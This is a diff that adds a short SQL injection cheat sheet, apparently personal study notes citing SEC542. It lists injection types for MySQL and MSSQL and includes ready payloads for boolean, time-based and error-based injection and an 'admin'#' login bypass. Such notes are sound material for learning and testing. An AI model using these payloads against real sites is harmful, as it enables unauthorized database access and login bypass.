@@ -1,5 +1,31 @@
 # SQL Injection
 
+## Types
+- MySQL
+  - Error Based
+    - Union Query
+      - Discovery: ```'``` & ```"``` & ```\``` 
+      - Exploitation (SEC542 - 5)
+    - Double Query (SEC542 - 5)
+  - Blind Based 
+    - Boolean (SEC542 - 5)
+    - Time Based (SEC542 - 5)
+
+
+- MSSQL
+  - Union Query
+    - ```union all select``` 
+  - Blined Based
+    - ```id=1' and 1=1--+```
+    - ```id=1' and 1=1#```
+  - Time Based
+    - ```id=1' and waitfor delay "00:00:10"```
+  - Error Based
+    - ```id=1 and 1=@@version--```
+    - ```id=1 and 1=db_name()--```
+
+
+
 ## Exploit
 - Login
   - username: ```admin'#``` 
